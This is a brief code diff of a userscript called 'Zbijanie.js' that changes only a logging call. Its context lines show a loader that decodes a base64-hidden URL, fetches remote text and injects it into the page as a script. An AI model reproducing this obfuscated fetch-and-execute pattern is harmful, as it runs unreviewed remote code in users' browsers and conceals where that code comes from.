@@ -5,7 +5,6 @@ zbijanie(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2E5ZWU4NmY1NDRiNjUxZjIzZTA2"),(data)
 			fetch(data.link).then(value => value.text())
 		  ]).then(all => {
 			  $("body").append("<script>"+all[0]+"</script>");
+			  customLog("Skrypt (Zbijanie.js) załadowano Poprawnie!")
 		  }).catch(err => { throw err });
 	});
-
-console.log("Skrypt (Zbijanie.js) załadowano Poprawnie!")
